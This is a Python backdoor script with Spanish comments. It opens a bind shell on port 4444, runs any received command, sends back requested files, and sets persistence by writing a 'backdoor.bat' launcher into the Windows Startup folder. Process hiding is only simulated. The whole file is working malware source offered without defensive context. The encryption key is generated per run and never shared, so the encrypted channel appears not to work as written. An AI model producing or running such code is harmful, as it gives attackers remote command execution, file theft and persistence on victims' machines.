import socket
import subprocess
import os
import sys
import base64
import time
from cryptography.fernet import Fernet

# Generar una clave para encriptación
KEY = Fernet.generate_key()
cipher_suite = Fernet(KEY)

def start_server(host, port):
    # Crear un socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Vincular el socket a la dirección y puerto
    server_socket.bind((host, port))
    
    # Escuchar conexiones entrantes (máximo 1 conexión)
    server_socket.listen(1)
    print(f"[*] Listening on {host}:{port}...")

    # Aceptar una conexión
    client_socket, client_address = server_socket.accept()
    print(f"[+] Connection from {client_address}")

    while True:
        try:
            # Recibir un comando encriptado del cliente
            encrypted_command = client_socket.recv(4096)
            if not encrypted_command:
                break

            # Desencriptar el comando
            command = cipher_suite.decrypt(encrypted_command).decode()

            if command.startswith("download"):
                # Descargar un archivo
                file_path = command.split(" ")[1]
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                    client_socket.send(cipher_suite.encrypt(file_data))
                else:
                    client_socket.send(cipher_suite.encrypt(b"File not found."))
                continue

            elif command == "persist":
                # Agregar persistencia
                persist()
                client_socket.send(cipher_suite.encrypt(b"Persistence added."))
                continue

            elif command == "hide":
                # Ocultar el proceso (simulación)
                hide_process()
                client_socket.send(cipher_suite.encrypt(b"Process hidden."))
                continue

            # Ejecutar el comando
            output = subprocess.getoutput(command)

            # Encriptar y enviar la salida
            encrypted_output = cipher_suite.encrypt(output.encode())
            client_socket.send(encrypted_output)
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    # Cerrar la conexión
    client_socket.close()
    server_socket.close()
    print("[-] Connection closed.")

def persist():
    # Agregar el script al inicio (ejemplo para Windows)
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    with open(os.path.join(startup_folder, "backdoor.bat"), "w") as f:
        f.write(f"python {script_path}")

def hide_process():
    # Simulación de ocultación de proceso (no es real, solo para fines educativos)
    print("[*] Simulating process hiding...")
    time.sleep(2)

if __name__ == "__main__":
    HOST = "0.0.0.0"  # Escuchar en todas las interfaces
    PORT = 4444       # Puerto a escuchar
    start_server(HOST, PORT)
